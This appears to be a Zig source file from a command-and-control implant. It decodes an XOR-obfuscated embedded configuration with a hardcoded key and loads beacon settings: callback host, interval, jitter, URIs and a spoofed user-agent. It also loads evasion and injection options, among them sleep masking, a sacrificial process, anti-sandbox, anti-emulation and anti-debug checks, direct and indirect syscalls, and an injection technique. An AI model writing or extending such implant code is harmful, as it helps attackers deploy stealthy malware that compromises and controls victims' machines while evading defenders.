const std = @import("std");
const obf = @import("obf.zig");

const nx_raw_config = @embedFile("agent_config.enc");
const nx_config_key = [_]u8{
    0x93, 0xE9, 0x83, 0xAE, 0x31, 0xCA, 0x45, 0x8A,
    0x07, 0xB5, 0x80, 0x78, 0x13, 0x3E, 0xEB, 0xD6,
    0xD5, 0xB0, 0x07, 0x58, 0xE1, 0xA7, 0x3D, 0x76,
    0xE0, 0xBA, 0x5B, 0x01, 0x6D, 0x33, 0x3F, 0x3A,
};

fn nx_decode_config(allocator: std.mem.Allocator) ![]u8 {
    const plain = try allocator.alloc(u8, nx_raw_config.len);
    for (nx_raw_config, 0..) |byte, index| {
        plain[index] = byte ^ nx_config_key[index % nx_config_key.len] ^
            @as(u8, @truncate(index *% 37 +% 11));
    }
    return plain;
}

pub const NxConfig = struct {
    uuid: []const u8,
    aes_key_hex: []const u8,
    callback_host: []const u8,
    callback_port: u16,
    callback_interval: u32,
    callback_jitter: u32,
    get_uri: []const u8,
    post_uri: []const u8,
    user_agent: []const u8,
    tls_verify: bool,
    proxy_host: []const u8,
    proxy_port: u16,
    kill_date: u32,
    debug: bool,
    sleep_mask: []const u8,
    alloc_strategy: []const u8,
    sacrificial_process: []const u8,
    pre_sleep_seconds: u32,
    injection_step_delay_ms: u32,
    require_domain_joined: bool,
    enable_anti_sandbox: bool,
    enable_computational_delay: bool,
    enable_anti_emulation: bool,
    enable_anti_debug: bool,
    use_direct_syscalls: bool,
    syscall_mode: []const u8,
    default_injection_technique: []const u8,
};

fn nx_str(obj: std.json.ObjectMap, comptime key: []const u8, default: []const u8) []const u8 {
    var buffer = obf.z(key);
    const value = obj.get(buffer.slice()) orelse return default;
    return value.string;
}

fn nx_int(obj: std.json.ObjectMap, comptime key: []const u8, default: i64) i64 {
    var buffer = obf.z(key);
    const value = obj.get(buffer.slice()) orelse return default;
    return value.integer;
}

fn nx_boolean(obj: std.json.ObjectMap, comptime key: []const u8, default: bool) bool {
    var buffer = obf.z(key);
    const value = obj.get(buffer.slice()) orelse return default;
    return value.bool;
}

/// Load the embedded build configuration. The backing JSON document is kept
/// alive for the process lifetime because the returned strings point into it.
pub fn nx_load(allocator: std.mem.Allocator) !NxConfig {
    const plain = try nx_decode_config(allocator);
    const parsed = try std.json.parseFromSlice(std.json.Value, allocator, plain, .{});
    const root = parsed.value.object;

    const port = nx_int(root, "callback_port", 443);
    const proxy_port = nx_int(root, "proxy_port", 0);

    return .{
        .uuid = nx_str(root, "uuid", "00000000-0000-0000-0000-000000000000"),
        .aes_key_hex = nx_str(root, "aes_key_hex", "0000000000000000000000000000000000000000000000000000000000000000"),
        .callback_host = nx_str(root, "callback_host", "https://127.0.0.1"),
        .callback_port = if (port > 0 and port <= 65535) @intCast(port) else 443,
        .callback_interval = @intCast(@min(@max(nx_int(root, "callback_interval", 10), 0), 86400)),
        .callback_jitter = @intCast(@min(@max(nx_int(root, "callback_jitter", 23), 0), 100)),
        .get_uri = nx_str(root, "get_uri", "/api/v1.4/agent_message"),
        .post_uri = nx_str(root, "post_uri", "/api/v1.4/agent_message"),
        .user_agent = nx_str(root, "user_agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"),
        .tls_verify = nx_boolean(root, "tls_verify", true),
        .proxy_host = nx_str(root, "proxy_host", ""),
        .proxy_port = if (proxy_port > 0 and proxy_port <= 65535) @intCast(proxy_port) else 0,
        .kill_date = @intCast(@min(@max(nx_int(root, "kill_date", 0), 0), 99991231)),
        .debug = nx_boolean(root, "debug", false),
        .sleep_mask = nx_str(root, "sleep_mask", "none"),
        .alloc_strategy = nx_str(root, "alloc_strategy", "memory_hole"),
        .sacrificial_process = nx_str(root, "sacrificial_process", ""),
        .pre_sleep_seconds = @intCast(@min(@max(nx_int(root, "pre_sleep_seconds", 0), 0), 31536000)),
        .injection_step_delay_ms = @intCast(@min(@max(nx_int(root, "injection_step_delay_ms", 0), 0), 600000)),
        .require_domain_joined = nx_boolean(root, "require_domain_joined", false),
        .enable_anti_sandbox = nx_boolean(root, "enable_anti_sandbox", true),
        .enable_computational_delay = nx_boolean(root, "enable_computational_delay", true),
        .enable_anti_emulation = nx_boolean(root, "enable_anti_emulation", true),
        .enable_anti_debug = nx_boolean(root, "enable_anti_debug", false),
        .use_direct_syscalls = nx_boolean(root, "use_direct_syscalls", true),
        .syscall_mode = nx_str(root, "syscall_mode", "indirect"),
        .default_injection_technique = nx_str(root, "default_injection_technique", "none"),
    };
}
